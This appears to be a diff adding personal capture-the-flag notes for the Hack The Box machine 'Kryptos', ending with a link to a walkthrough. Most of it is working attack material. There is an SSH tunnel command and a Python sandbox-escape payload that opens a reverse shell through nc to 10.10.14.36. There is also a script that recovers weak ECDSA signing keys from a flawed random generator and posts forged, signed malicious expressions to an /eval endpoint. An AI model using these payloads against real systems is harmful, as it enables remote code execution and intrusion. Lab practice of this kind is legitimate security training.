@@ -146,4 +146,80 @@ while True:
         time.sleep(1)
 
 
+krypto
+ssh -L 81:127.0.0.1:81 rijndael@10.10.10.129 -f -N
+
+python3 e.py 500 "{}.__class__.__mro__[1].__subclasses__()[121].__init__.__globals__['__builtins__']['__import__']('os').system('rm -f /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | nc 10.10.14.36 1234 >/tmp/p')"
+
+import random
+import json   
+import hashlib
+import binascii
+from ecdsa import VerifyingKey, SigningKey, NIST384p
+import base64
+import requests
+import sys
+
+# not-so-secure PRNG ;)
+def secure_rng(seed):
+  # Taken from the internet - probably secure
+  p = 2147483647
+  g = 2255412
+
+  keyLength = 32
+  ret = 0
+  ths = round((p-1)/2)
+  for i in range(keyLength*8):
+    seed = pow(g,seed,p)
+    if seed > ths:
+      ret += 2**i
+  return ret
+
+# sign
+def sign(sk, msg):
+    return binascii.hexlify(sk.sign(msg))
+
+# Generate n not-so-secure random numbers
+def generate_randoms(n):
+  randoms = []
+  for _ in range(n):
+    seed = random.getrandbits(128)
+    rand = secure_rng(seed) + 1
+    randoms.append(rand)
+  return randoms
+
+# generate signing keys
+def generate_keys(x):
+  keys = []
+  for _ in x:
+    sk = SigningKey.from_secret_exponent(_, curve=NIST384p)
+    keys.append(sk)
+  return keys
+
+# generate not-so-secure random numbers
+n = int(sys.argv[1])
+print("[+] Generating %d not-so-secure random numbers" % n)
+random_numbers = generate_randoms(n)
+unique_numbers = list(set(random_numbers))
+print("[+] We got %d unique numbers" % len(unique_numbers))
+
+# generate signing keys
+print("[+] Generating signing keys from unique numbers")
+keys = generate_keys(unique_numbers)
+
+# Here goes nothing...
+expr = sys.argv[2] # change this to a malicious expression
+print("[+] Expression: %s" % expr)
+
+for key in keys:
+  json = {'expr': expr, "sig": sign(key, str.encode(expr)).decode()}
+  headers = {'Content-Type': 'application/json'}
+  r = requests.post('http://127.0.0.1:81/eval', json=json, headers=headers)
+
+  if "Bad" not in r.text and "Error" not in r.text:
+    print (r.text)
+    exit()
+
+https://hackso.me/kryptos-htb-walkthrough/
+
 
